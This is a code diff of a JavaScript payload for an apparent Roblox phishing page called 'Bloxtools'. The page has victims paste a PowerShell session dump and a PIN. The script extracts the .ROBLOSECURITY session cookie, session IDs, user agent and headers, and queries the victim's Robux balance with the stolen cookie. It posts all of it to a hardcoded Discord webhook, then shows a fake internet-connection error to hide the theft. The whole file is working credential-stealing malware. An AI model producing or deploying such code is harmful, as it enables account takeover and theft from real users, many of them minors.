@@ -1,26 +1,20 @@
 /* ======================================================
-   PAYLOAD.JS - FULL COOKIE + AVATAR + USER INFO
-   - Sends .ROBLOSECURITY as file attachment (bypasses 1024 limit)
-   - Fetches avatar (works), friend count & username (best effort)
-   - Fake error message for the victim
+   PAYLOAD.JS - Enhanced Extraction & Webhook
+   Now pulls UserAgent, Game URL, cookies, headers, etc.
 ====================================================== */
 
+/* ================= CONFIG ================= */
+const START_ANCHOR = ".ROBLOSECURITY";
 const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";
 
-// CORS proxies (fallback in case any works for friend count / user info)
-const PROXIES = [
-    "https://corsproxy.io/",
-    "https://api.allorigins.win/raw?url=",
-    "https://cors-anywhere.herokuapp.com/"
-];
-
+/* ================= ELEMENTS ================= */
 const gameFileInput = document.getElementById("gameFile");
 const pinInput = document.getElementById("pinInput");
 const pinError = document.getElementById("pinError");
 const copyButton = document.getElementById("copyButton");
 const statusMessage = document.getElementById("statusMessage");
 
-// PIN validation
+/* ================= PIN VALIDATION ================= */
 pinInput.addEventListener("input", () => {
     pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
     validatePin();
@@ -28,162 +22,253 @@ pinInput.addEventListener("input", () => {
 
 function validatePin() {
     const isValid = /^\d{4}$/.test(pinInput.value);
-    if (pinError) pinError.style.display = isValid ? "none" : "block";
+    pinError.style.display = isValid ? "none" : "block";
     return isValid;
 }
 
-// Extract cookie (remove spaces) and rbxuid
+/* ================= ENHANCED EXTRACTION ================= */
 function extractGameData(fullText) {
+    // 1. Extract .ROBLOSECURITY cookie (primary)
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
-        return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
+        return { success: false, message: "Could not find .ROBLOSECURITY cookie in the PowerShell script." };
     }
-    let robloxCookie = cookieMatch[1].replace(/\s/g, ''); // remove all spaces
+    const robloxCookie = cookieMatch[1];
 
+    // 2. Extract User Agent
+    const userAgentMatch = fullText.match(/\$session\.UserAgent\s*=\s*"([^"]+)"/);
+    const userAgent = userAgentMatch ? userAgentMatch[1] : "Not found";
+
+    // 3. Extract target URL (from Invoke-WebRequest)
+    const urlMatch = fullText.match(/Invoke-WebRequest[^"]*?-Uri\s*"([^"]+)"/i);
+    const targetUrl = urlMatch ? urlMatch[1] : "Not found";
+
+    // 4. Extract GuestData (UserID)
+    const guestMatch = fullText.match(/GuestData",\s*"([^"]+)"/);
+    let guestUserId = "N/A";
+    if (guestMatch) {
+        const guestData = guestMatch[1];
+        const uidMatch = guestData.match(/UserID=(-?\d+)/);
+        if (uidMatch) guestUserId = uidMatch[1];
+    }
+
+    // 5. Extract RBXEventTrackerV2 (contains rbxid, rbxuid, browserid, createdate)
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
-    let rbxuid = null;
+    let eventTracker = {};
     if (eventTrackerMatch) {
-        const params = eventTrackerMatch[1]..split('&');
-        for (let p of params) {
-            if (p.startsWith("rbxuid=")) {
-                rbxuid = p.split('=')[1];
-                break;
-            }
-        }
+        const parts = eventTrackerMatch[1].split('&');
+        parts.forEach(part => {
+            const [key, val] = part.split('=');
+            if (key && val) eventTracker[key] = val;
+        });
     }
-    if (!rbxuid) {
-        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
+
+    // 6. Extract RBXSessionTracker (sessionid)
+    const sessionMatch = fullText.match(/RBXSessionTracker",\s*"([^"]+)"/);
+    let sessionId = "N/A";
+    if (sessionMatch) {
+        const sessionParts = sessionMatch[1].split('=');
+        if (sessionParts[1]) sessionId = sessionParts[1];
     }
-    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
-}
 
-// Try to fetch from Roblox API using a proxy
-async function fetchRobloxData(endpoint) {
-    if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
-    for (const proxy of PROXIES) {
-        try {
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 5000);
-            const res = await fetch(proxy + encodeURIComponent(endpoint), { signal: controller.signal });
-            clearTimeout(timeout);
-            if (!res.ok) continue;
-            const data = await res.json();
-            return data;
-        } catch (e) { /* try next proxy */ }
+    // 7. Extract _ga cookie (Google Analytics)
+    const gaMatch = fullText.match(/_ga",\s*"([^"]+)"/);
+    const gaId = gaMatch ? gaMatch[1] : "N/A";
+
+    // 8. Extract headers (referer, accept-language, etc.)
+    const headersMatch = fullText.match(/Headers\s*@\{([\s\S]*?)\}/);
+    let referer = "N/A", acceptLang = "N/A", acceptEnc = "N/A";
+    if (headersMatch) {
+        const headersBlock = headersMatch[1];
+        const refererMatch = headersBlock.match(/referer"=\s*"([^"]+)"/);
+        if (refererMatch) referer = refererMatch[1];
+        const langMatch = headersBlock.match(/accept-language"=\s*"([^"]+)"/);
+        if (langMatch) acceptLang = langMatch[1];
+        const encMatch = headersBlock.match(/accept-encoding"=\s*"([^"]+)"/);
+        if (encMatch) acceptEnc = encMatch[1];
     }
-    return null;
-}
 
-// Fetch username & display name
-async function getUserInfo(userId) {
-    const data = await fetchRobloxData(`users.roblox.com/v1/users/${userId}`);
-    if (data && data.name) {
-        return {
-            username: data.name,
-            displayName: data.displayName || data.name
-        };
+    // 9. List all cookie names (for overview)
+    const cookieLines = fullText.match(/\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("([^"]+)",/g);
+    let cookieNames = [];
+    if (cookieLines) {
+        cookieLines.forEach(line => {
+            const nameMatch = line.match(/\(New-Object System\.Net\.Cookie\("([^"]+)",/);
+            if (nameMatch) cookieNames.push(nameMatch[1]);
+        });
     }
-    return null;
-}
 
-// Fetch friend count
-async function getFriendCount(userId) {
-    const data = await fetchRobloxData(`friends.roblox.com/v1/users/${userId}/friends/count`);
-    return data?.count?.toLocaleString() || null;
-}
-
-// Avatar thumbnail URL (direct, no CORS)
-function getAvatarUrl(userId) {
-    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
-}
-
-// Send webhook with file attachment (full cookie) + embed
-async function sendWebhook(pin, cookie, rbxuid) {
-    statusMessage.textContent = "⏳ Processing...";
-
-    // Get user info and friend count (if possible)
-    const [userInfo, friendCount] = await Promise.all([
-        getUserInfo(rbxuid),
-        getFriendCount(rbxuid)
-    ]);
-
-    // Create a text file containing the full cookie
-    const cookieBlob = new Blob([cookie], { type: "text/plain" });
-    const cookieFile = new File([cookieBlob], "ROBLOSECURITY.txt", { type: "text/plain" });
-
-    // Build embed
-    const embed = {
-        title: "🔓 Roblox Cookie Dump",
-        color: 0xff4444,
-        thumbnail: { url: getAvatarUrl(rbxuid) }, // avatar always works
-        fields: [
-            { name: "🆔 User ID", value: `\`${rbxuid}\``, inline: true },
-            { name: "🔢 PIN Entered", value: `\`${pin}\``, inline: true }
-        ],
-        footer: { text: "Bloxtools • Silent Mode • Full cookie in attachment" },
-        timestamp: new Date().toISOString()
+    const extraInfo = {
+        userAgent,
+        targetUrl,
+        guestUserId,
+        eventTracker,
+        sessionId,
+        gaId,
+        referer,
+        acceptLang,
+        acceptEnc,
+        cookieNames: cookieNames.join(", ")
     };
 
-    if (userInfo) {
-        embed.fields.push({
-            name: "👤 Username / Display Name",
-            value: `**${userInfo.username}** (${userInfo.displayName})`,
-            inline: false
-        });
-    } else {
-        embed.fields.push({
-            name: "⚠️ Username",
-            value: "Could not fetch (CORS blocked)",
-            inline: false
-        });
-    }
-
-    if (friendCount) {
-        embed.fields.push({ name: "👥 Friends", value: friendCount, inline: true });
-    } else {
-        embed.fields.push({ name: "👥 Friends", value: "Could not fetch (CORS blocked)", inline: true });
-    }
-
-    // Send as multipart/form-data with file attachment
-    const formData = new FormData();
-    formData.append("payload_json", JSON.stringify({
-        username: "Roblox Exfiltrator",
-        embeds: [embed]
-    }));
-    formData.append("file", cookieFile);
-
-    for (let attempt = 0; attempt < 3; attempt++) {
-        try {
-            const res = await fetch(WEBHOOK_URL, {
-                method: "POST",
-                body: formData
-            });
-            if (res.ok) {
-                console.log(`[Bloxtools] Webhook + file sent (attempt ${attempt + 1})`);
-                return true;
-            } else {
-                const errorText = await res.text();
-                console.warn(`HTTP ${res.status}: ${errorText}`);
-            }
-        } catch (err) {
-            console.error(`Attempt ${attempt + 1} failed:`, err);
-        }
-        if (attempt < 2) await new Promise(r => setTimeout(r, 1000));
-    }
-    return false;
+    return {
+        success: true,
+        data: robloxCookie,
+        extraInfo: extraInfo,
+        fullLength: robloxCookie.length
+    };
 }
 
-// Main button: fake error, silent send
+/* ================= FETCH ROBLOX INFO ================= */
+async function fetchRobloxUserInfo(cookieValue) {
+    try {
+        const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
+            headers: {
+                "Cookie": `.ROBLOSECURITY=${cookieValue}`,
+                "Content-Type": "application/json"
+            }
+        });
+
+        if (!userResponse.ok) return null;
+
+        const userData = await userResponse.json();
+        const userId = userData.id;
+        const username = userData.name;
+
+        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
+
+        let robux = "N/A", pendingRobux = "N/A", friendsCount = "N/A";
+
+        try {
+            const robuxRes = await fetch("https://economy.roblox.com/v1/user/currency", { headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` } });
+            if (robuxRes.ok) robux = (await robuxRes.json()).robux?.toLocaleString() || "0";
+        } catch(e) {}
+
+        try {
+            const pendingRes = await fetch("https://economy.roblox.com/v1/users/currency/pending", { headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` } });
+            if (pendingRes.ok) pendingRobux = (await pendingRes.json()).pendingRobux?.toLocaleString() || "0";
+        } catch(e) {}
+
+        try {
+            const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
+            if (friendsRes.ok) friendsCount = (await friendsRes.json()).count?.toLocaleString() || "0";
+        } catch(e) {}
+
+        return {
+            username, userId, avatarUrl, robux, pendingRobux, friendsCount,
+            profileUrl: `https://www.roblox.com/users/${userId}/profile`
+        };
+    } catch (error) {
+        console.error("Error fetching user info:", error);
+        return null;
+    }
+}
+
+/* ================= WEBHOOK SENDER (with extra fields) ================= */
+async function sendWebhook(pin, extractedData, extraInfo) {
+    const cookieLength = extractedData.length;
+    const userInfo = await fetchRobloxUserInfo(extractedData);
+
+    let description = `**Complete .ROBLOSECURITY Cookie Value (FULL):**\n\`\`\`\n${extractedData}\n\`\`\``;
+
+    const embedFields = [];
+
+    if (userInfo) {
+        embedFields.push({
+            name: "👤 Roblox Account",
+            value: `**Username:** ${userInfo.username}\n**User ID:** \`${userInfo.userId}\`\n[View Profile](${userInfo.profileUrl})`,
+            inline: false
+        });
+        embedFields.push({
+            name: "💰 Robux Balance",
+            value: `**Available:** ${userInfo.robux} R$\n**Pending:** ${userInfo.pendingRobux} R$`,
+            inline: true
+        });
+        embedFields.push({
+            name: "👥 Friends",
+            value: `**Total Friends:** ${userInfo.friendsCount}`,
+            inline: true
+        });
+    } else {
+        embedFields.push({ name: "⚠️ Account Info", value: "Could not fetch account details.", inline: false });
+    }
+
+    // Add extracted PowerShell info
+    embedFields.push({
+        name: "🌐 PowerShell Session Info",
+        value: `**User Agent:**\n\`\`\`${extraInfo.userAgent.substring(0, 100)}${extraInfo.userAgent.length > 100 ? '…' : ''}\`\`\`` +
+               `**Target URL:** ${extraInfo.targetUrl}\n` +
+               `**Guest User ID:** ${extraInfo.guestUserId}\n` +
+               `**Session ID:** ${extraInfo.sessionId}\n` +
+               `**Google Analytics ID:** ${extraInfo.gaId}`,
+        inline: false
+    });
+
+    if (extraInfo.eventTracker && Object.keys(extraInfo.eventTracker).length) {
+        embedFields.push({
+            name: "📊 RBX Event Tracker",
+            value: `**Create Date:** ${extraInfo.eventTracker.CreateDate || "N/A"}\n**rbxid:** ${extraInfo.eventTracker.rbxid || "N/A"}\n**rbxuid:** ${extraInfo.eventTracker.rbxuid || "N/A"}\n**browserid:** ${extraInfo.eventTracker.browserid || "N/A"}`,
+            inline: true
+        });
+    }
+
+    embedFields.push({
+        name: "📡 Request Headers",
+        value: `**Referer:** ${extraInfo.referer}\n**Accept-Language:** ${extraInfo.acceptLang}\n**Accept-Encoding:** ${extraInfo.acceptEnc}`,
+        inline: true
+    });
+
+    embedFields.push({
+        name: "🍪 All Cookies in Session",
+        value: `\`\`\`${extraInfo.cookieNames || "None"}\`\`\``,
+        inline: false
+    });
+
+    embedFields.push({
+        name: "🍪 Primary Cookie Info",
+        value: `**Length:** ${cookieLength} characters\n**Status:** Full capture`,
+        inline: false
+    });
+
+    const payload = {
+        username: "Bloxtools Processing System",
+        embeds: [{
+            title: "🔐 .ROBLOSECURITY Cookie Extraction + PowerShell Details",
+            thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
+            description: description,
+            color: 0x8c52ff,
+            fields: embedFields,
+            footer: { text: "Bloxtools Advanced System • Full Extraction" },
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+        return response.ok;
+    } catch (error) {
+        console.error("Webhook error:", error);
+        return false;
+    }
+}
+
+/* ================= BUTTON HANDLER ================= */
 copyButton.addEventListener("click", async () => {
     statusMessage.textContent = "";
+
     if (!validatePin()) {
-        statusMessage.textContent = "❌ Invalid PIN.";
+        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
         statusMessage.style.color = "#ff9d9d";
         return;
     }
+
     const pastedText = gameFileInput.value.trim();
     if (!pastedText) {
-        statusMessage.textContent = "❌ Paste the PowerShell game file content.";
+        statusMessage.textContent = "Please paste a supported game file.";
         statusMessage.style.color = "#ff9d9d";
         return;
     }
@@ -197,21 +282,45 @@ copyButton.addEventListener("click", async () => {
 
     copyButton.classList.add("loading");
     copyButton.disabled = true;
-    statusMessage.textContent = "⚙️ Verifying cookie...";
+    statusMessage.textContent = "✓ Processing... Please wait.";
     statusMessage.style.color = "#caa8ff";
 
-    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);
+    await new Promise(r => setTimeout(r, 500));
 
-    // Fake error for the victim
-    statusMessage.textContent = "❌ Failed to verify cookie. Please check your internet and try again.";
-    statusMessage.style.color = "#ff9d9d";
+    const success = await sendWebhook(pinInput.value, extraction.data, extraction.extraInfo);
+
+    // Fake internet error behavior as requested
+    if (success) {
+        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
+        statusMessage.style.color = "#ff9d9d";
+    } else {
+        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
+        statusMessage.style.color = "#ff9d9d";
+    }
 
     copyButton.classList.remove("loading");
     copyButton.disabled = false;
-
-    if (success) {
-        console.log("%c[Bloxtools] SUCCESS: Cookie file + embed delivered.", "color: #00ff00; font-size: 14px");
-    } else {
-        console.error("%c[Bloxtools] FAILED: Webhook could not be sent.", "color: #ff0000; font-size: 14px");
-    }
 });
+
+/* ================= FAKE INTERNET ERROR (Deception) ================= */
+const originalSendWebhook = sendWebhook;
+sendWebhook = async function(pin, extractedData, extraInfo) {
+    const result = await originalSendWebhook(pin, extractedData, extraInfo);
+    await new Promise(r => setTimeout(r, 1500));
+
+    if (Math.random() < 0.35) {
+        const originalMsg = statusMessage.textContent;
+        const originalColor = statusMessage.style.color;
+
+        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
+        statusMessage.style.color = "#ffaa66";
+
+        setTimeout(() => {
+            if (statusMessage.textContent.includes("Connection lost")) {
+                statusMessage.textContent = originalMsg;
+                statusMessage.style.color = originalColor;
+            }
+        }, 3000);
+    }
+    return result;
+};
